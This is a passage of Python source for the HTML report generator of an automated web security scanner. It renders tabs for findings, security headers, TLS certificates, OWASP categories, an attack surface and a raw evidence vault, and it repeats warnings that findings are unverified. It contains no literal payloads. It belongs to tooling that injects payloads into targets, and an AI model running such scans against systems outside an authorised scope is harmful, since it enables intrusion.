.badge-high { background: var(--high); color: #fff; }
.badge-medium { background: var(--medium); color: #fff; }
.badge-low { background: var(--low); color: #fff; }
.badge-info { background: var(--info); color: #fff; }
.badge-yes { background: #2e7d32; color: #fff; }
.badge-no { background: var(--medium); color: #fff; }
.disclaimer {
  background: #fff3cd;
  border: 1px solid #ffc107;
  padding: 12px 16px;
  margin: 12px 0;
  border-radius: 4px;
}
.disclaimer strong { color: #856404; }
pre, code {
  font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
  font-size: 12px;
}
pre {
  background: var(--code-bg);
  border: 1px solid var(--border);
  padding: 12px;
  overflow-x: auto;
  max-height: 400px;
  white-space: pre-wrap;
  word-wrap: break-word;
}
.collapsible {
  border: 1px solid var(--border);
  background: #fff;
  margin: 8px 0;
}
.collapsible summary {
  padding: 8px 12px;
  cursor: pointer;
  font-weight: 600;
  background: #f8f8f8;
}
.collapsible[open] summary { border-bottom: 1px solid var(--border); }
.screenshot {
  max-width: 100%;
  border: 1px solid var(--border);
  margin: 8px 0;
}
.screenshot-thumb {
  max-width: 200px;
  max-height: 150px;
  cursor: pointer;
  border: 1px solid var(--border);
}
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 12px;
  margin: 16px 0;
}
.stat-card {
  background: #fff;
  border: 1px solid var(--border);
  padding: 16px;
  border-radius: 4px;
  text-align: center;
}
.stat-card .number { font-size: 28px; font-weight: 700; color: var(--accent); }
.stat-card .label { font-size: 12px; color: #666; text-transform: uppercase; }
.subtab-nav {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
  margin: 12px 0;
  border-bottom: 1px solid var(--border);
  padding-bottom: 8px;
}
.subtab-nav button {
  background: #f0f0f0;
  border: 1px solid var(--border);
  padding: 6px 12px;
  font-size: 12px;
  cursor: pointer;
  border-radius: 3px;
}
.subtab-nav button.active {
  background: var(--accent);
  color: #fff;
  border-color: var(--accent);
}
.subtab-panel { display: none; }
.subtab-panel.active { display: block; }
.finding-screenshot {
  max-width: 100%;
  border: 2px solid var(--high);
  margin: 8px 0;
}
.steps-to-reproduce {
  background: #fff;
  border-left: 4px solid var(--accent);
  padding: 12px 16px;
  margin: 8px 0;
}
.steps-to-reproduce li { margin: 4px 0; }
.note {
  background: #e3f2fd;
  border: 1px solid #2196f3;
  padding: 8px 12px;
  margin: 8px 0;
  border-radius: 4px;
  font-size: 13px;
}
.risk-matrix {
  width: 100%;
  border-collapse: collapse;
  margin: 12px 0;
}
.risk-matrix th, .risk-matrix td {
  text-align: center;
  border: 1px solid var(--border);
  padding: 12px;
}
footer {
  border-top: 1px solid var(--border);
  padding: 16px 24px;
  font-size: 12px;
  color: #666;
  background: #fff;
}
"""

    # =====================================================================
    # HEADER + BANNER
    # =====================================================================

    def _interrupted_banner(self) -> str:
        """The red 'SCAN WAS INTERRUPTED' banner, if applicable."""
        if not self.interrupted:
            return '<div class="interrupted-banner hidden"></div>'
        return (
            '<div class="interrupted-banner">'
            '⚠ SCAN WAS INTERRUPTED MANUALLY. This report contains '
            'PARTIAL DATA. Findings and evidence may be incomplete; '
            're-run the scan for full coverage.'
            '</div>'
        )

    def _header(self) -> str:
        """The dark header bar with target URL + timestamps."""
        duration = (self.scan_ended_at - self.scan_started_at).total_seconds()
        return f"""
<header class="report-header">
  <h1>Web Security Assessment Report</h1>
  <div class="meta">
    Target: {_esc(self.target_url)} |
    Started: {_esc(self.scan_started_at.isoformat(timespec='seconds'))} |
    Ended: {_esc(self.scan_ended_at.isoformat(timespec='seconds'))} |
    Duration: {duration:.1f}s |
    Findings: {len(self.findings)}
  </div>
</header>"""

    # =====================================================================
    # TAB NAVIGATION
    # =====================================================================

    def _tab_nav(self) -> str:
        """The top-level tab bar."""
        tabs = [
            ("exec", "Executive Summary"),
            ("headers", "Header Analysis"),
            ("surface", "Attack Surface"),
            ("ssl", "SSL/TLS &amp; Crypto"),
            ("owasp", "OWASP Top 10 (2025)"),
            ("evidence", "Raw Evidence Vault"),
        ]
        buttons = "\n".join(
            f'<button data-tab="{tid}" onclick="showTab(\'{tid}\')">{label}</button>'
            for tid, label in tabs
        )
        return f'<nav class="tab-nav">{buttons}</nav>'

    # =====================================================================
    # TAB 1: EXECUTIVE SUMMARY
    # =====================================================================

    def _tab_executive_summary(self) -> str:
        """Stats, scope, risk matrix, AI disclaimer, LLM summary."""
        # Count findings by severity.
        sev_counts = {"High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for f in self.findings:
            sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1
        # Stats cards.
        stats = [
            ("Total URLs Crawled", len(self.crawl_map)),
            ("In-Scope (Fuzzable) URLs",
             sum(1 for c in self.crawl_map if c.in_scope)),
            ("Injection Points Found", len(self.attack_surface)),
            ("Total Findings (Unverified)", len(self.findings)),
            ("High Severity", sev_counts.get("High", 0)),
            ("Medium Severity", sev_counts.get("Medium", 0)),
            ("Low Severity", sev_counts.get("Low", 0)),
            ("Missing Security Headers",
             len(self.passive.missing_security_headers)),
        ]
        stats_html = "\n".join(
            f'<div class="stat-card"><div class="number">{n}</div>'
            f'<div class="label">{_esc(label)}</div></div>'
            for label, n in stats
        )
        # Risk matrix — a 3x3 grid (likelihood vs impact).
        risk_html = self._risk_matrix(sev_counts)
        # Scope configuration.
        scope = self.scope_config
        scope_html = f"""
<h3>Scope of Engagement</h3>
<table>
  <tr><th>Parameter</th><th>Value</th></tr>
  <tr><td>Target URL</td><td>{_esc(scope.get('target_url',''))}</td></tr>
  <tr><td>Crawl Depth</td><td>{scope.get('depth','')}</td></tr>
  <tr><td>Scope Patterns</td><td>{_esc(', '.join(scope.get('scope_patterns',[])) or '(all in-domain)')}</td></tr>
  <tr><td>Exclude Patterns</td><td>{_esc(', '.join(scope.get('exclude_patterns',[])) or '(none)')}</td></tr>
  <tr><td>Delay (ms)</td><td>{scope.get('delay_ms','')}</td></tr>
  <tr><td>Concurrency</td><td>{scope.get('concurrency','')}</td></tr>
  <tr><td>Robots.txt</td><td>{'ignored' if scope.get('ignore_robots') else 'respected'}</td></tr>
  <tr><td>External Links</td><td>{'allowed' if scope.get('allow_external') else 'blocked'}</td></tr>
  <tr><td>Login URL</td><td>{_esc(scope.get('login_url','(none — unauthenticated scan)'))}</td></tr>
  <tr><td>Login User</td><td>{_esc(scope.get('login_user','(none)'))}</td></tr>
  <tr><td>Login Succeeded</td><td>{
    # Three states: None (no login attempted), True (success), False (failed).
    # We colour-code because an UNVERIFIED login (None) and a FAILED login
    # (False) have very different implications for scan coverage.
    '<span class="badge badge-yes">Yes</span>' if scope.get('login_succeeded') is True
    else '<span class="badge badge-no">No (scan ran unauthenticated — coverage limited)</span>' if scope.get('login_succeeded') is False
    else '<span class="badge badge-info">N/A (unauthenticated scan)</span>'
  }</td></tr>
  <tr><td>Payload Manifest</td><td>{_esc(scope.get('payload_manifest','payload_manifest.json'))} &nbsp;<span class="text-muted">(full list of payloads/wordlist/probes sent to the target — see this file in the scan output dir for your audit trail / client report)</span></td></tr>
</table>"""
        # Top findings list.
        top_findings_html = self._top_findings_list()
        return f"""
<section class="tab-panel active" id="tab-exec">
  <h2>Executive Summary</h2>
  <div class="disclaimer">
    <strong>⚠ AI-ASSISTED REPORT DISCLAIMER:</strong>
    THIS IS AN AI-ASSISTED REPORT. NO FINDING IS CONFIRMED. MANUAL
    VERIFICATION BY A QUALIFIED ENGINEER IS REQUIRED BEFORE
    REMEDIATION. The tool automates evidence collection, not verdicts.
  </div>
  <div class="stats-grid">{stats_html}</div>
  {scope_html}
  <h3>Risk Matrix (based on unverified findings)</h3>
  {risk_html}
  <h3>Top Findings (highest severity first)</h3>
  {top_findings_html}
  <h3>Executive Summary Narrative</h3>
  <div class="note">
    The narrative below was generated for management readability. It
    does NOT confirm any finding. Refer to the OWASP Top 10 tab for
    full evidence.
  </div>
  <div>{_esc(self.executive_summary).replace(chr(10), '<br>')}</div>
</section>"""

    def _risk_matrix(self, sev_counts: Dict[str, int]) -> str:
        """A simple 3x3 likelihood-impact matrix."""
        # We populate the matrix with finding counts by severity as a
        # rough proxy. A real risk matrix would map each finding to a
        # (likelihood, impact) cell — that requires business context the
        # tool doesn't have, so we use severity as the impact axis.
        cells = {
            ("Low", "Low"): "—",
            ("Low", "Med"): "—",
            ("Low", "High"): sev_counts.get("Low", 0) or "—",
            ("Med", "Low"): "—",
            ("Med", "Med"): sev_counts.get("Medium", 0) or "—",
            ("Med", "High"): sev_counts.get("Medium", 0) or "—",
            ("High", "Low"): sev_counts.get("High", 0) or "—",
            ("High", "Med"): sev_counts.get("High", 0) or "—",
            ("High", "High"): sev_counts.get("High", 0) or "—",
        }
        rows = ""
        for impact in ["High", "Med", "Low"]:
            row = f"<tr><td><strong>{impact}</strong></td>"
            for likelihood in ["Low", "Med", "High"]:
                val = cells.get((likelihood, impact), "—")
                cls = ""
                if isinstance(val, int) and val > 0:
                    if impact == "High":
                        cls = "severity-high"
                    elif impact == "Med":
                        cls = "severity-medium"
                    else:
                        cls = "severity-low"
                row += f'<td class="{cls}">{val}</td>'
            rows += row + "</tr>"
        return f"""
<table class="risk-matrix">
  <tr><th>Impact ↓ / Likelihood →</th><th>Low</th><th>Medium</th><th>High</th></tr>
  {rows}
</table>
<p><small>Cells show the count of unverified findings at each severity
band. Empty cells (—) indicate no findings recorded at that combination.
This is a triage aid, not a final risk rating.</small></p>"""

    def _top_findings_list(self) -> str:
        """Render the top 10 findings as a compact list."""
        if not self.findings:
            return "<p>No active findings were recorded.</p>"
        # Sort by severity (High > Medium > Low > Info), then by title.
        sev_order = {"High": 0, "Medium": 1, "Low": 2, "Info": 3}
        sorted_f = sorted(self.findings,
                          key=lambda f: (sev_order.get(f.severity, 99),
                                         f.title))
        rows = []
        for i, f in enumerate(sorted_f[:10], 1):
            sev_class = f.severity.lower()
            rows.append(
                f'<tr><td>{i}</td>'
                f'<td><span class="badge badge-{sev_class}">{_esc(f.severity)}</span></td>'
                f'<td><a href="#" onclick="showTab(\'owasp\'); '
                f'showFinding(\'{_esc(f.finding_id)}\'); return false;">'
                f'{_esc(f.title)}</a></td>'
                f'<td>{_esc(f.owasp_category)}</td>'
                f'<td><code>{_esc(f.url)}</code></td>'
                f'<td>UNVERIFIED</td></tr>'
            )
        return f"""
<table>
  <tr><th>#</th><th>Severity</th><th>Title</th><th>OWASP</th>
      <th>URL</th><th>Status</th></tr>
  {''.join(rows)}
</table>"""

    # =====================================================================
    # TAB 2: HEADER ANALYSIS
    # =====================================================================

    def _tab_header_analysis(self) -> str:
        """Table A (cross-referenced) + Table B (anomalies) + Table C (value mismatches) + screenshot.

        Table A: All captured headers, with columns for:
          - Header Name
          - Header Value (actual)
          - In Reference List? (Yes/No)
          - Expected Value (from whitelist; blank if name-only entry)
          - Matches Expected? (Yes/No/N-A — N-A when no expected value declared)
        Table B: Headers NOT in the reference list (potential anomalies).
        Table C: Headers IN the reference list but whose values DON'T match
          the declared expected value. These are policy violations: the
          header is present (good) but configured incorrectly (bad).
        """
        # --- Table A: all headers, with reference + value-match columns ---
        rows_a = []
        for h in self.header_records:
            in_ref_badge = ('<span class="badge badge-yes">Yes</span>'
                            if h.in_reference
                            else '<span class="badge badge-no">No</span>')
            # Matches-expected column has three states:
            #   - "N/A" (grey)     : header not in reference, OR in reference
            #                        but no expected value declared.
            #   - "Yes" (green)    : in reference with expected value, matches.
            #   - "No" (red/orange): in reference with expected value, mismatch.
            if not h.in_reference or not h.expected_value:
                match_badge = '<span class="badge badge-info">N/A</span>'
            elif h.value_matches_expected:
                match_badge = '<span class="badge badge-yes">Yes</span>'
            else:
                match_badge = '<span class="badge badge-no">No</span>'
            rows_a.append(
                f'<tr><td><code>{_esc(h.name)}</code></td>'
                f'<td><code>{_esc(h.value)}</code></td>'
                f'<td>{in_ref_badge}</td>'
                f'<td><code>{_esc(h.expected_value)}</code></td>'
                f'<td>{match_badge}</td></tr>'
            )
        # --- Table B: only headers NOT in the reference list ---
        anomalies = [h for h in self.header_records if not h.in_reference]
        rows_b = []
        for h in anomalies:
            rows_b.append(
                f'<tr><td><code>{_esc(h.name)}</code></td>'
                f'<td><code>{_esc(h.value)}</code></td></tr>'
            )
        # --- Table C: headers IN reference but with mismatched values ---
        # This is the "policy violation" table. The header is present
        # (good) but its value does not match the engineer-declared
        # expected value (bad). Examples:
        #   - HSTS declared with max-age=31536000 but server returned max-age=0
        #   - X-Frame-Options declared as DENY but server returned SAMEORIGIN
        #   - CSP declared with a specific policy but server returned none
        mismatches = [h for h in self.header_records
                      if h.in_reference and h.expected_value
                      and not h.value_matches_expected]
        rows_c = []
        for h in mismatches:
            rows_c.append(
                f'<tr><td><code>{_esc(h.name)}</code></td>'
                f'<td><code>{_esc(h.value)}</code></td>'
                f'<td><code>{_esc(h.expected_value)}</code></td></tr>'
            )
        # Before screenshot.
        before_img = ""
        if self.before_screenshot and self.before_screenshot.exists():
            b64 = EvidenceEngine.encode_image_base64(self.before_screenshot)
            if b64:
                before_img = (
                    f'<h3>Landing Page Screenshot (pre-fuzz)</h3>'
                    f'<img class="screenshot" src="{b64}" '
                    f'alt="Landing page screenshot">'
                )
        # Compose the mismatch disclaimer (only shown if there are mismatches).
        mismatch_disclaimer = ""
        if mismatches:
            mismatch_disclaimer = (
                '<div class="disclaimer">'
                f'<strong>⚠ {len(mismatches)} Header Value Mismatch(es) Detected:</strong> '
                'The headers in Table C are PRESENT (good) but their values '
                'do NOT match the expected values declared in your whitelist. '
                'The engineer must review each mismatch and decide whether the '
                'actual value represents a security weakness (e.g. HSTS with '
                'max-age=0 effectively disables HSTS despite the header being '
                'present).'
                '</div>'
            )
        return f"""
<section class="tab-panel" id="tab-headers">
  <h2>Header Analysis</h2>
  <div class="disclaimer">
    <strong>Engineer Action Required:</strong>
    The engineer must manually review Table B (unexpected headers) and
    Table C (value mismatches) to determine if any represent security
    misconfigurations, information leaks, or policy violations. The tool
    does NOT automatically mark any header as "good" or "bad" — it
    compares against the engineer-declared whitelist policy.
  </div>
  {before_img}
  <h3>Table A: Headers Found in Response (Cross-referenced with Reference List)</h3>
  <p><small>The "Expected Value" column shows the value(s) declared in your
  whitelist.txt. "N/A" in the Matches Expected column means no expected
  value was declared for that header (only presence was required).</small></p>
  <table>
    <tr><th>Header Name</th><th>Header Value</th><th>In Reference List?</th>
        <th>Expected Value</th><th>Matches Expected?</th></tr>
    {''.join(rows_a) if rows_a else '<tr><td colspan="5">No headers captured.</td></tr>'}
  </table>
  <h3>Table B: Headers NOT in Reference List (Potential Anomalies)</h3>
  <table>
    <tr><th>Header Name</th><th>Header Value</th></tr>
    {''.join(rows_b) if rows_b else '<tr><td colspan="2">No anomalies detected — every response header was in the reference list.</td></tr>'}
  </table>
  {mismatch_disclaimer}
  <h3>Table C: Headers with Unexpected Values (Policy Violations)</h3>
  <p><small>These headers ARE in your reference list, but their actual
  values do not match the expected values you declared. Empty table =
  all present-and-expected headers had matching values.</small></p>
  <table>
    <tr><th>Header Name</th><th>Actual Value</th><th>Expected Value</th></tr>
    {''.join(rows_c) if rows_c else '<tr><td colspan="3">No value mismatches detected — every reference header with a declared expected value matched.</td></tr>'}
  </table>
  <p><small>Raw header data is also saved to <code>headers_raw.json</code>
  in the output folder for import into Burp or other tooling.</small></p>
</section>"""

    # =====================================================================
    # TAB 3: ATTACK SURFACE
    # =====================================================================

    def _tab_attack_surface(self) -> str:
        """Discovered URLs + injection points (rendered via JS from JSON)."""
        # We render the static scaffolding here and let the inline JS
        # populate the tables from the embedded JSON. This keeps the
        # HTML small even for thousands of inputs.
        return """
<section class="tab-panel" id="tab-surface">
  <h2>Attack Surface</h2>
  <div class="disclaimer">
    <strong>Engineer Action Required:</strong>
    These are SUGGESTED injection points. The engineer must manually
    decide which to test. The tool does NOT auto-fuzz every input —
    that would be reckless on production targets.
  </div>
  <h3>Discovered URLs (Crawl Map)</h3>
  <div id="crawl-map-table">Loading…</div>
  <h3>Injection Points</h3>
  <div id="attack-surface-table">Loading…</div>
  <p><small>Structured data is also saved to <code>crawl_map.json</code>
  and <code>attack_surface.json</code> in the output folder.</small></p>
</section>"""

    # =====================================================================
    # TAB 4: SSL/TLS & CRYPTO
    # =====================================================================

    def _tab_ssl(self) -> str:
        """Certificate details + cipher review."""
        r = self.ssl_record
        # Expiry alert.
        expiry_alert = ""
        if r.is_expired:
            expiry_alert = (
                '<div class="disclaimer"><strong>⚠ EXPIRED CERTIFICATE:</strong> '
                'The certificate is past its notAfter date.</div>'
            )
        elif r.days_until_expiry is not None and r.days_until_expiry < 30:
            expiry_alert = (
                f'<div class="disclaimer"><strong>⚠ EXPIRY IMMINENT:</strong> '
                f'Certificate expires in {r.days_until_expiry} days.</div>'
            )
        # Trust alerts.
        trust_alerts = []
        if r.is_self_signed:
            trust_alerts.append("Self-signed certificate (subject == issuer)")
        if r.is_untrusted_root:
            trust_alerts.append("Untrusted root CA")
        if r.hostname_mismatch:
            trust_alerts.append("Hostname mismatch (CN/SAN does not match target)")
        trust_html = ""
        if trust_alerts:
            trust_html = (
                '<div class="disclaimer"><strong>⚠ Trust Issues:</strong><ul><li>'
                + '</li><li>'.join(_esc(t) for t in trust_alerts)
                + '</li></ul></div>'
            )
        # Weak crypto alerts.
        weak_html = ""
        if r.weak_ciphers_detected or r.weak_protocols_detected:
            weak_items = []
            for c in r.weak_ciphers_detected:
                weak_items.append(f"Weak cipher: {_esc(c)}")
            for p in r.weak_protocols_detected:
                weak_items.append(f"Weak protocol: {_esc(p)}")
            weak_html = (
                '<div class="disclaimer"><strong>⚠ Weak Cryptographic '
                'Configuration:</strong><ul><li>'
                + '</li><li>'.join(weak_items)
                + '</li></ul></div>'
            )
        return f"""
<section class="tab-panel" id="tab-ssl">
  <h2>SSL/TLS &amp; Crypto</h2>
  {expiry_alert}
  {trust_html}
  {weak_html}
  <h3>Certificate Details</h3>
  <table>
    <tr><th>Attribute</th><th>Value</th></tr>
    <tr><td>Hostname</td><td><code>{_esc(r.hostname)}:{r.port}</code></td></tr>
    <tr><td>Subject</td><td><code>{_esc(r.subject)}</code></td></tr>
    <tr><td>Issuer</td><td><code>{_esc(r.issuer)}</code></td></tr>
    <tr><td>Not Before</td><td>{_esc(r.not_before)}</td></tr>
    <tr><td>Not After</td><td>{_esc(r.not_after)}</td></tr>
    <tr><td>Days Until Expiry</td><td>{r.days_until_expiry if r.days_until_expiry is not None else 'N/A'}</td></tr>
    <tr><td>Self-Signed</td><td>{'Yes' if r.is_self_signed else 'No'}</td></tr>
    <tr><td>Hostname Mismatch</td><td>{'Yes' if r.hostname_mismatch else 'No'}</td></tr>
  </table>
  <h3>Negotiated Connection</h3>
  <table>
    <tr><th>Attribute</th><th>Value</th></tr>
    <tr><td>Protocol</td><td><code>{_esc(r.negotiated_protocol or 'N/A')}</code></td></tr>
    <tr><td>Cipher Suite</td><td><code>{_esc(r.negotiated_cipher or 'N/A')}</code></td></tr>
  </table>
  <h3>Certificate Chain (PEM)</h3>
  <details class="collapsible">
    <summary>Click to expand PEM chain (also saved to <code>cert_chain.pem</code>)</summary>
    <pre>{_esc(r.pem_chain)}</pre>
  </details>
  <p><small>The full certificate chain was saved to <code>cert_chain.pem</code>
  in the output folder for inspection with <code>openssl x509 -text</code>.</small></p>
</section>"""

    # =====================================================================
    # TAB 5: OWASP TOP 10 (nested sub-tabs)
    # =====================================================================

    def _tab_owasp(self) -> str:
        """Primary OWASP category tabs + per-finding sub-tabs."""
        # Group findings by OWASP category.
        by_cat: Dict[str, List[Finding]] = {}
        for f in self.findings:
            by_cat.setdefault(f.owasp_category, []).append(f)
        # Primary tab buttons — only show categories that have findings.
        primary_buttons = []
        for cat in OWASP_2025_CATEGORIES:
            if cat in by_cat:
                cat_id = cat.replace(" ", "_").replace("/", "_")
                primary_buttons.append(
                    f'<button data-owasp-cat="{_esc(cat)}" '
                    f'onclick="showOwaspCategory(\'{_esc(cat)}\')">'
                    f'{_esc(cat)} ({len(by_cat[cat])})</button>'
                )
        primary_nav = (
            '<div class="subtab-nav">' + ''.join(primary_buttons) + '</div>'
            if primary_buttons
            else '<p>No active findings were recorded. Passive findings '
                 '(missing headers, insecure cookies, mixed content) are '
                 'listed below.</p>'
        )
        # Build per-category panels.
        cat_panels = []
        for cat in OWASP_2025_CATEGORIES:
            if cat not in by_cat:
                continue
            findings = by_cat[cat]
            # Sub-tab nav for each finding.
            sub_buttons = []
            for i, f in enumerate(findings, 1):
                sub_buttons.append(
                    f'<button data-finding-id="{_esc(f.finding_id)}" '
                    f'onclick="showFinding(\'{_esc(f.finding_id)}\')">'
                    f'Finding {i}: {_esc(f.title[:60])}'
                    f'{"…" if len(f.title) > 60 else ""}</button>'
                )
            sub_nav = '<div class="subtab-nav">' + ''.join(sub_buttons) + '</div>'
            # Per-finding panels.
            finding_panels = []
            for i, f in enumerate(findings, 1):
                finding_panels.append(self._render_finding_panel(f, i))
            cat_panels.append(
                f'<div class="owasp-cat-panel" id="owasp-cat-{_esc(cat)}" '
                f'style="display:none;">'
                f'<h3>{_esc(cat)}</h3>'
                f'{sub_nav}'
                + ''.join(finding_panels)
                + '</div>'
            )
        # Passive findings section (always shown at the bottom of OWASP tab).
        passive_html = self._render_passive_findings()
        return f"""
<section class="tab-panel" id="tab-owasp">
  <h2>OWASP Top 10 (2025)</h2>
  <div class="disclaimer">
    <strong>ALL FINDINGS ARE UNVERIFIED — Requires Manual Confirmation.</strong>
    The tool uses strict regex matching to flag POTENTIAL issues. A match
    is not proof of exploitability. The engineer must manually verify each
    finding using the provided raw request/response evidence.
  </div>
  {primary_nav}
  {''.join(cat_panels)}
  {passive_html}
</section>"""

    def _render_finding_panel(self, f: Finding, index: int) -> str:
        """Render a single finding's sub-tab content."""
        sev_class = f.severity.lower()
        # Screenshot (if any).
        screenshot_html = ""
        if f.screenshot_path and Path(f.screenshot_path).exists():
            b64 = EvidenceEngine.encode_image_base64(Path(f.screenshot_path))
            if b64:
                screenshot_html = (
                    f'<h4>Screenshot at Moment of Detection</h4>'
                    f'<img class="finding-screenshot" src="{b64}" '
                    f'alt="Screenshot of finding {f.finding_id}">'
                )
        # Steps to reproduce (from the execution trail).
        steps_html = ""
        if f.execution_trail:
            steps_html = (
                '<div class="steps-to-reproduce">'
                '<h4>Steps to Reproduce</h4><ul>'
                + ''.join(f'<li>{_esc(s)}</li>' for s in f.execution_trail)
                + '</ul></div>'
            )
        # Patterns matched.
        patterns_html = ""
        if f.patterns_matched:
            patterns_html = (
                '<h4>Detection Patterns Matched</h4><ul>'
                + ''.join(f'<li><code>{_esc(p)}</code></li>'
                          for p in f.patterns_matched)
                + '</ul>'
            )
        # Payload.
        payload_html = (
            f'<h4>Payload Injected</h4>'
            f'<pre>{_esc(f.payload)}</pre>'
        )
        # Raw request/response (collapsible).
        req_resp_html = f"""
<h4>Raw HTTP Evidence</h4>
<details class="collapsible">
  <summary>Request (click to expand)</summary>
  <pre>{_esc(f.request_raw)}</pre>
</details>
<details class="collapsible">
  <summary>Response (click to expand)</summary>
  <pre>{_esc(f.response_raw)}</pre>
</details>"""
        # --- AI Assessment annotation (if LLM analysis is available) ---
        ai_html = ""
        ai_cls = self._ai_lookup.get(f.finding_id)
        is_fp = f.finding_id in self._fp_ids
        if ai_cls or is_fp:
            parts = []
            if ai_cls:
                conf = str(ai_cls.get("confidence", "?")).lower()
                conf_badge_cls = "badge-yes" if conf in ("high", "medium") else "badge-no"
                parts.append(
                    f'<tr><th>AI Confidence</th><td>'
                    f'<span class="badge {conf_badge_cls}">{_esc(ai_cls.get("confidence", "?"))}</span>'
                    f' &mdash; <small>{_esc(ai_cls.get("reasoning", ""))}</small></td></tr>'
                )
            if is_fp:
                fp_reason = ""
                for fp in (self.ai_analysis or {}).get("false_positive_candidates", []):
                    if isinstance(fp, dict) and fp.get("finding_id") == f.finding_id:
                        fp_reason = str(fp.get("reasoning", ""))
                        break
                parts.append(
                    f'<tr><th>AI Assessment</th><td>'
                    f'<span class="badge badge-no">LIKELY FALSE POSITIVE</span>'
                    f' &mdash; <small>{_esc(fp_reason)}</small></td></tr>'
                )
            ai_html = '<table>' + ''.join(parts) + '</table>'
        return f"""
<div class="subtab-panel" id="finding-{_esc(f.finding_id)}" style="display:none;">
  <h4>Finding {index}: {_esc(f.title)}</h4>
  <table>
    <tr><th>Severity</th><td><span class="badge badge-{sev_class}">{_esc(f.severity)}</span></td></tr>
    <tr><th>OWASP Category</th><td>{_esc(f.owasp_category)}</td></tr>
    <tr><th>URL</th><td><code>{_esc(f.url)}</code></td></tr>
    <tr><th>Finding ID</th><td><code>{_esc(f.finding_id)}</code></td></tr>
    <tr><th>Status</th><td><strong>UNVERIFIED — Requires Manual Confirmation</strong></td></tr>
  </table>
  {ai_html}
  {screenshot_html}
  {steps_html}
  {patterns_html}
  {payload_html}
  {req_resp_html}
</div>"""

    def _render_passive_findings(self) -> str:
        """Render the passive findings (headers, cookies, mixed content)."""
        # Missing security headers.
        missing_html = ""
        if self.passive.missing_security_headers:
            missing_html = (
                '<h3>Missing Security Headers</h3><ul>'
                + ''.join(f'<li><code>{_esc(h)}</code></li>'
                          for h in self.passive.missing_security_headers)
                + '</ul>'
            )
        # Insecure cookies.
        cookies_html = ""
        if self.passive.insecure_cookies:
            rows = []
            for c in self.passive.insecure_cookies:
                rows.append(
                    f'<tr><td><code>{_esc(c.get("name",""))}</code></td>'
                    f'<td>{_esc(c.get("domain",""))}</td>'
                    f'<td>{_esc(c.get("path",""))}</td>'
                    f'<td>{_esc(", ".join(c.get("issues",[])))}</td></tr>'
                )
            cookies_html = (
                '<h3>Insecure Cookies (flags missing)</h3>'
                '<table><tr><th>Name</th><th>Domain</th><th>Path</th>'
                '<th>Issues</th></tr>' + ''.join(rows) + '</table>'
            )
        # Mixed content.
        mixed_html = ""
        if self.passive.mixed_content:
            rows = []
            for m in self.passive.mixed_content[:50]:
                rows.append(
                    f'<tr><td>{_esc(m.get("tag",""))}</td>'
                    f'<td>{_esc(m.get("attr",""))}</td>'
                    f'<td><code>{_esc(m.get("url",""))}</code></td></tr>'
                )
            extra = ""
            if len(self.passive.mixed_content) > 50:
                extra = (f'<p><small>… and {len(self.passive.mixed_content)-50} '
                         f'more (see <code>execution_trail.jsonl</code>).</small></p>')
            mixed_html = (
                '<h3>Mixed Content (HTTP resources on HTTPS page)</h3>'
                '<table><tr><th>Tag</th><th>Attribute</th><th>URL</th></tr>'
                + ''.join(rows) + '</table>' + extra
            )
        if not (missing_html or cookies_html or mixed_html):
            return ""
        return f"""
<h3>Passive Findings (no payloads sent)</h3>
{missing_html}
{cookies_html}
{mixed_html}"""

    # =====================================================================
    # TAB 6: RAW EVIDENCE VAULT
    # =====================================================================

    def _tab_evidence_vault(self) -> str:
        """File browser for raw .txt evidence files."""
        if not self.evidence_files:
            return """
<section class="tab-panel" id="tab-evidence">
  <h2>Raw Evidence Vault</h2>
  <p>No raw evidence files were generated. This indicates either no
  active checks were run, or no payloads were injected.</p>
</section>"""
        rows = []
        for ev in self.evidence_files:
            size_kb = ev.get("size_bytes", 0) / 1024.0
            rows.append(
                f'<tr><td><code>{_esc(ev.get("name",""))}</code></td>'
                f'<td>{size_kb:.1f} KB</td>'
                f'<td>{_esc(ev.get("modified",""))}</td>'
                f'<td><button onclick="loadEvidence(\'{_esc(ev.get("name",""))}\')">View</button></td></tr>'
            )
        return f"""
<section class="tab-panel" id="tab-evidence">
  <h2>Raw Evidence Vault</h2>
  <p>Each file below contains the raw HTTP request, raw HTTP response,
  and rendered DOM for a single injection test. Files are named
  <code>&lt;timestamp&gt;_&lt;test_id&gt;_&lt;check&gt;.txt</code>.</p>
  <table>
    <tr><th>Filename</th><th>Size</th><th>Modified</th><th>Action</th></tr>
    {''.join(rows)}
  </table>
  <details class="collapsible">
    <summary>Selected evidence file content (click View above)</summary>
    <pre id="evidence-viewer">Select a file to view its contents.</pre>
  </details>
  <p><small>Files are also available on disk in the output folder for
  offline inspection.</small></p>
</section>"""

    # =====================================================================
    # INLINE JAVASCRIPT
    # =====================================================================

    def _javascript(self) -> str:
        """Return the inline JS for tab switching + dynamic rendering.

        We use vanilla JS (no framework) to keep the report self-contained.
        The JS reads the embedded JSON <script> blocks and populates the
        Attack Surface table, the Evidence Vault viewer, and the OWASP
        sub-tab navigation.
        """
        return r"""
// --- Top-level tab switching ---
function showTab(tabId) {
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('nav.tab-nav button').forEach(b => b.classList.remove('active'));
  const panel = document.getElementById('tab-' + tabId);
  if (panel) panel.classList.add('active');
  const btn = document.querySelector(`nav.tab-nav button[data-tab="${tabId}"]`);
  if (btn) btn.classList.add('active');
}

// --- OWASP category + finding sub-tab switching ---
function showOwaspCategory(cat) {
  document.querySelectorAll('.owasp-cat-panel').forEach(p => p.style.display = 'none');
  const panel = document.getElementById('owasp-cat-' + cat);
  if (panel) panel.style.display = 'block';
  // Show the first finding by default.
  const first = panel.querySelector('.subtab-panel');
  if (first) showFinding(first.id.replace('finding-', ''));
}
function showFinding(findingId) {
  document.querySelectorAll('.subtab-panel').forEach(p => p.style.display = 'none');
  const panel = document.getElementById('finding-' + findingId);
  if (panel) panel.style.display = 'block';
}

// --- Read embedded JSON ---
function readJson(id) {
  const el = document.getElementById(id);
  if (!el) return null;
  try { return JSON.parse(el.textContent); } catch(e) { return null; }
}

// --- Populate the Attack Surface tab ---
function populateAttackSurface() {
  const crawl = readJson('crawl-data') || [];
  const surface = readJson('surface-data') || [];
  // Crawl map table.
  const crawlHtml = '<table><tr><th>URL</th><th>Depth</th><th>Source</th>' +
    '<th>In Scope (Fuzzable)</th></tr>' +
    crawl.map(c =>
